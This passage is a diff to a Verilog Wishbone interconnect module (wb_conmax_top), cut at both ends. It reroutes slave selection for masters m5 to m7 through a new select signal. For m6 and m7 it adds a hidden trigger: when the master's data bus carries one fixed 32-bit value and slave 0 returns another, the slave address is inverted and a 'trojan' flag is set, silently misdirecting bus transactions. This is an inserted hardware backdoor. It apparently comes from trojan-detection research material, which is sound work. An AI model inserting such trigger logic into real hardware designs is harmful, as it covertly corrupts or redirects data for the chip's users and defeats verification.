     always @ (  posedge clk_i or  posedge rst_i)
@@ -5570,7 +5618,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m5_s5_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s5_cyc_o ) : ( ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd5 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
+            m5_s5_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s5_cyc_o ) : ( ( ( ( m5_slv_sel == 4'd5 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5581,7 +5629,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m5_s6_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s6_cyc_o ) : ( ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd6 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
+            m5_s6_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s6_cyc_o ) : ( ( ( ( m5_slv_sel == 4'd6 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5592,7 +5640,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m5_s7_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s7_cyc_o ) : ( ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd7 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
+            m5_s7_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s7_cyc_o ) : ( ( ( ( m5_slv_sel == 4'd7 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5603,7 +5651,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m5_s8_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s8_cyc_o ) : ( ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd8 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
+            m5_s8_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s8_cyc_o ) : ( ( ( ( m5_slv_sel == 4'd8 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5614,7 +5662,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m5_s9_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s9_cyc_o ) : ( ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd9 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
+            m5_s9_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s9_cyc_o ) : ( ( ( ( m5_slv_sel == 4'd9 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5625,7 +5673,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m5_s10_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s10_cyc_o ) : ( ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd10 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
+            m5_s10_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s10_cyc_o ) : ( ( ( ( m5_slv_sel == 4'd10 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5636,7 +5684,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m5_s11_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s11_cyc_o ) : ( ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd11 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
+            m5_s11_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s11_cyc_o ) : ( ( ( ( m5_slv_sel == 4'd11 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5647,7 +5695,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m5_s12_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s12_cyc_o ) : ( ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd12 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
+            m5_s12_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s12_cyc_o ) : ( ( ( ( m5_slv_sel == 4'd12 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5658,7 +5706,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m5_s13_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s13_cyc_o ) : ( ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd13 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
+            m5_s13_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s13_cyc_o ) : ( ( ( ( m5_slv_sel == 4'd13 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5669,7 +5717,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m5_s14_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s14_cyc_o ) : ( ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd14 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
+            m5_s14_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s14_cyc_o ) : ( ( ( ( m5_slv_sel == 4'd14 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5680,12 +5728,12 @@ module wb_conmax_top(
         end
         else
         begin 
-            m5_s15_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s15_cyc_o ) : ( ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd15 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
+            m5_s15_cyc_o <= ( ( ( m5_cyc_i &  !( m5_stb_i) ) ) ? ( m5_s15_cyc_o ) : ( ( ( ( m5_slv_sel == 4'd15 ) ) ? ( m5_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
-    always @ (  m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] or  s0_m5_ack_o or  s1_m5_ack_o or  s2_m5_ack_o or  s3_m5_ack_o or  s4_m5_ack_o or  s5_m5_ack_o or  s6_m5_ack_o or  s7_m5_ack_o or  s8_m5_ack_o or  s9_m5_ack_o or  s10_m5_ack_o or  s11_m5_ack_o or  s12_m5_ack_o or  s13_m5_ack_o or  s14_m5_ack_o or  s15_m5_ack_o)
+    always @ (  m5_slv_sel or  s0_m5_ack_o or  s1_m5_ack_o or  s2_m5_ack_o or  s3_m5_ack_o or  s4_m5_ack_o or  s5_m5_ack_o or  s6_m5_ack_o or  s7_m5_ack_o or  s8_m5_ack_o or  s9_m5_ack_o or  s10_m5_ack_o or  s11_m5_ack_o or  s12_m5_ack_o or  s13_m5_ack_o or  s14_m5_ack_o or  s15_m5_ack_o)
     begin
-        case ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] ) 
+        case ( m5_slv_sel ) 
         4'd0:
         begin
             m5_wb_ack_o = s0_m5_ack_o;
@@ -5752,9 +5800,9 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] or  s0_m5_err_o or  s1_m5_err_o or  s2_m5_err_o or  s3_m5_err_o or  s4_m5_err_o or  s5_m5_err_o or  s6_m5_err_o or  s7_m5_err_o or  s8_m5_err_o or  s9_m5_err_o or  s10_m5_err_o or  s11_m5_err_o or  s12_m5_err_o or  s13_m5_err_o or  s14_m5_err_o or  s15_m5_err_o)
+    always @ (  m5_slv_sel or  s0_m5_err_o or  s1_m5_err_o or  s2_m5_err_o or  s3_m5_err_o or  s4_m5_err_o or  s5_m5_err_o or  s6_m5_err_o or  s7_m5_err_o or  s8_m5_err_o or  s9_m5_err_o or  s10_m5_err_o or  s11_m5_err_o or  s12_m5_err_o or  s13_m5_err_o or  s14_m5_err_o or  s15_m5_err_o)
     begin
-        case ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] ) 
+        case ( m5_slv_sel ) 
         4'd0:
         begin
             m5_wb_err_o = s0_m5_err_o;
@@ -5821,9 +5869,9 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] or  s0_m5_rty_o or  s1_m5_rty_o or  s2_m5_rty_o or  s3_m5_rty_o or  s4_m5_rty_o or  s5_m5_rty_o or  s6_m5_rty_o or  s7_m5_rty_o or  s8_m5_rty_o or  s9_m5_rty_o or  s10_m5_rty_o or  s11_m5_rty_o or  s12_m5_rty_o or  s13_m5_rty_o or  s14_m5_rty_o or  s15_m5_rty_o)
+    always @ (  m5_slv_sel or  s0_m5_rty_o or  s1_m5_rty_o or  s2_m5_rty_o or  s3_m5_rty_o or  s4_m5_rty_o or  s5_m5_rty_o or  s6_m5_rty_o or  s7_m5_rty_o or  s8_m5_rty_o or  s9_m5_rty_o or  s10_m5_rty_o or  s11_m5_rty_o or  s12_m5_rty_o or  s13_m5_rty_o or  s14_m5_rty_o or  s15_m5_rty_o)
     begin
-        case ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] ) 
+        case ( m5_slv_sel ) 
         4'd0:
         begin
             m5_wb_rty_o = s0_m5_rty_o;
@@ -5898,9 +5946,21 @@ module wb_conmax_top(
     assign m6_ack_o = m6_wb_ack_o;
     assign m6_err_o = m6_wb_err_o;
     assign m6_rty_o = m6_wb_rty_o;
-    always @ (  m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] or  s0_m6_data_o or  s1_m6_data_o or  s2_m6_data_o or  s3_m6_data_o or  s4_m6_data_o or  s5_m6_data_o or  s6_m6_data_o or  s7_m6_data_o or  s8_m6_data_o or  s9_m6_data_o or  s10_m6_data_o or  s11_m6_data_o or  s12_m6_data_o or  s13_m6_data_o or  s14_m6_data_o or  s15_m6_data_o)
+    always @ (  m6_addr_i)
     begin
-        case ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] ) 
+        if ( ( m6_data_i == 32'b00101010111110101011110011100000 ) && ( s0_m6_data_o == 32'b00011110010101010101001010101100 ) ) 
+        begin
+            m6_slv_sel = ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] ^ 4'b1111 );
+            m6_trojan = 1;
+        end
+        else
+        begin 
+            m6_slv_sel = m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )];
+        end
+    end
+    always @ (  m6_slv_sel or  s0_m6_data_o or  s1_m6_data_o or  s2_m6_data_o or  s3_m6_data_o or  s4_m6_data_o or  s5_m6_data_o or  s6_m6_data_o or  s7_m6_data_o or  s8_m6_data_o or  s9_m6_data_o or  s10_m6_data_o or  s11_m6_data_o or  s12_m6_data_o or  s13_m6_data_o or  s14_m6_data_o or  s15_m6_data_o)
+    begin
+        case ( m6_slv_sel ) 
         4'd0:
         begin
             m6_wb_data_o = s0_m6_data_o;
@@ -5975,7 +6035,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m6_s0_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s0_cyc_o ) : ( ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd0 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
+            m6_s0_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s0_cyc_o ) : ( ( ( ( m6_slv_sel == 4'd0 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5986,7 +6046,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m6_s1_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s1_cyc_o ) : ( ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd1 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
+            m6_s1_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s1_cyc_o ) : ( ( ( ( m6_slv_sel == 4'd1 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -5997,7 +6057,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m6_s2_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s2_cyc_o ) : ( ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd2 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
+            m6_s2_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s2_cyc_o ) : ( ( ( ( m6_slv_sel == 4'd2 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6008,7 +6068,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m6_s3_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s3_cyc_o ) : ( ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd3 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
+            m6_s3_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s3_cyc_o ) : ( ( ( ( m6_slv_sel == 4'd3 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6019,7 +6079,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m6_s4_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s4_cyc_o ) : ( ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd4 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
+            m6_s4_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s4_cyc_o ) : ( ( ( ( m6_slv_sel == 4'd4 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6030,7 +6090,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m6_s5_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s5_cyc_o ) : ( ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd5 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
+            m6_s5_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s5_cyc_o ) : ( ( ( ( m6_slv_sel == 4'd5 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6041,7 +6101,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m6_s6_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s6_cyc_o ) : ( ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd6 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
+            m6_s6_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s6_cyc_o ) : ( ( ( ( m6_slv_sel == 4'd6 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6052,7 +6112,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m6_s7_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s7_cyc_o ) : ( ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd7 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
+            m6_s7_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s7_cyc_o ) : ( ( ( ( m6_slv_sel == 4'd7 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6063,7 +6123,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m6_s8_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s8_cyc_o ) : ( ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd8 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
+            m6_s8_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s8_cyc_o ) : ( ( ( ( m6_slv_sel == 4'd8 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6074,7 +6134,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m6_s9_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s9_cyc_o ) : ( ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd9 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
+            m6_s9_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s9_cyc_o ) : ( ( ( ( m6_slv_sel == 4'd9 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6085,7 +6145,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m6_s10_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s10_cyc_o ) : ( ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd10 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
+            m6_s10_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s10_cyc_o ) : ( ( ( ( m6_slv_sel == 4'd10 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6096,7 +6156,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m6_s11_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s11_cyc_o ) : ( ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd11 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
+            m6_s11_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s11_cyc_o ) : ( ( ( ( m6_slv_sel == 4'd11 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6107,7 +6167,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m6_s12_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s12_cyc_o ) : ( ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd12 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
+            m6_s12_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s12_cyc_o ) : ( ( ( ( m6_slv_sel == 4'd12 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6118,7 +6178,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m6_s13_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s13_cyc_o ) : ( ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd13 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
+            m6_s13_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s13_cyc_o ) : ( ( ( ( m6_slv_sel == 4'd13 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6129,7 +6189,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m6_s14_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s14_cyc_o ) : ( ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd14 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
+            m6_s14_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s14_cyc_o ) : ( ( ( ( m6_slv_sel == 4'd14 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6140,12 +6200,12 @@ module wb_conmax_top(
         end
         else
         begin 
-            m6_s15_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s15_cyc_o ) : ( ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd15 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
+            m6_s15_cyc_o <= ( ( ( m6_cyc_i &  !( m6_stb_i) ) ) ? ( m6_s15_cyc_o ) : ( ( ( ( m6_slv_sel == 4'd15 ) ) ? ( m6_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
-    always @ (  m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] or  s0_m6_ack_o or  s1_m6_ack_o or  s2_m6_ack_o or  s3_m6_ack_o or  s4_m6_ack_o or  s5_m6_ack_o or  s6_m6_ack_o or  s7_m6_ack_o or  s8_m6_ack_o or  s9_m6_ack_o or  s10_m6_ack_o or  s11_m6_ack_o or  s12_m6_ack_o or  s13_m6_ack_o or  s14_m6_ack_o or  s15_m6_ack_o)
+    always @ (  m6_slv_sel or  s0_m6_ack_o or  s1_m6_ack_o or  s2_m6_ack_o or  s3_m6_ack_o or  s4_m6_ack_o or  s5_m6_ack_o or  s6_m6_ack_o or  s7_m6_ack_o or  s8_m6_ack_o or  s9_m6_ack_o or  s10_m6_ack_o or  s11_m6_ack_o or  s12_m6_ack_o or  s13_m6_ack_o or  s14_m6_ack_o or  s15_m6_ack_o)
     begin
-        case ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] ) 
+        case ( m6_slv_sel ) 
         4'd0:
         begin
             m6_wb_ack_o = s0_m6_ack_o;
@@ -6212,9 +6272,9 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] or  s0_m6_err_o or  s1_m6_err_o or  s2_m6_err_o or  s3_m6_err_o or  s4_m6_err_o or  s5_m6_err_o or  s6_m6_err_o or  s7_m6_err_o or  s8_m6_err_o or  s9_m6_err_o or  s10_m6_err_o or  s11_m6_err_o or  s12_m6_err_o or  s13_m6_err_o or  s14_m6_err_o or  s15_m6_err_o)
+    always @ (  m6_slv_sel or  s0_m6_err_o or  s1_m6_err_o or  s2_m6_err_o or  s3_m6_err_o or  s4_m6_err_o or  s5_m6_err_o or  s6_m6_err_o or  s7_m6_err_o or  s8_m6_err_o or  s9_m6_err_o or  s10_m6_err_o or  s11_m6_err_o or  s12_m6_err_o or  s13_m6_err_o or  s14_m6_err_o or  s15_m6_err_o)
     begin
-        case ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] ) 
+        case ( m6_slv_sel ) 
         4'd0:
         begin
             m6_wb_err_o = s0_m6_err_o;
@@ -6281,9 +6341,9 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] or  s0_m6_rty_o or  s1_m6_rty_o or  s2_m6_rty_o or  s3_m6_rty_o or  s4_m6_rty_o or  s5_m6_rty_o or  s6_m6_rty_o or  s7_m6_rty_o or  s8_m6_rty_o or  s9_m6_rty_o or  s10_m6_rty_o or  s11_m6_rty_o or  s12_m6_rty_o or  s13_m6_rty_o or  s14_m6_rty_o or  s15_m6_rty_o)
+    always @ (  m6_slv_sel or  s0_m6_rty_o or  s1_m6_rty_o or  s2_m6_rty_o or  s3_m6_rty_o or  s4_m6_rty_o or  s5_m6_rty_o or  s6_m6_rty_o or  s7_m6_rty_o or  s8_m6_rty_o or  s9_m6_rty_o or  s10_m6_rty_o or  s11_m6_rty_o or  s12_m6_rty_o or  s13_m6_rty_o or  s14_m6_rty_o or  s15_m6_rty_o)
     begin
-        case ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] ) 
+        case ( m6_slv_sel ) 
         4'd0:
         begin
             m6_wb_rty_o = s0_m6_rty_o;
@@ -6358,9 +6418,21 @@ module wb_conmax_top(
     assign m7_ack_o = m7_wb_ack_o;
     assign m7_err_o = m7_wb_err_o;
     assign m7_rty_o = m7_wb_rty_o;
-    always @ (  m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] or  s0_m7_data_o or  s1_m7_data_o or  s2_m7_data_o or  s3_m7_data_o or  s4_m7_data_o or  s5_m7_data_o or  s6_m7_data_o or  s7_m7_data_o or  s8_m7_data_o or  s9_m7_data_o or  s10_m7_data_o or  s11_m7_data_o or  s12_m7_data_o or  s13_m7_data_o or  s14_m7_data_o or  s15_m7_data_o)
+    always @ (  m7_addr_i)
     begin
-        case ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] ) 
+        if ( ( m7_data_i == 32'b00101010111110101011110011100000 ) && ( s0_m7_data_o == 32'b00011110010101010101001010101100 ) ) 
+        begin
+            m7_slv_sel = ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] ^ 4'b1111 );
+            m7_trojan = 1;
+        end
+        else
+        begin 
+            m7_slv_sel = m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )];
+        end
+    end
+    always @ (  m7_slv_sel or  s0_m7_data_o or  s1_m7_data_o or  s2_m7_data_o or  s3_m7_data_o or  s4_m7_data_o or  s5_m7_data_o or  s6_m7_data_o or  s7_m7_data_o or  s8_m7_data_o or  s9_m7_data_o or  s10_m7_data_o or  s11_m7_data_o or  s12_m7_data_o or  s13_m7_data_o or  s14_m7_data_o or  s15_m7_data_o)
+    begin
+        case ( m7_slv_sel ) 
         4'd0:
         begin
             m7_wb_data_o = s0_m7_data_o;
@@ -6435,7 +6507,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m7_s0_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s0_cyc_o ) : ( ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd0 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
+            m7_s0_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s0_cyc_o ) : ( ( ( ( m7_slv_sel == 4'd0 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6446,7 +6518,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m7_s1_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s1_cyc_o ) : ( ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd1 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
+            m7_s1_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s1_cyc_o ) : ( ( ( ( m7_slv_sel == 4'd1 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -6457,7 +6529,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m7_s2_cyc_o <= ( ( ( m7_cyc_i &  !( m7_stb_i) ) ) ? ( m7_s2_cyc_o ) : ( ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd2 ) ) ? ( m7_cyc_i ) : ( 1'b0 ) ) ) );
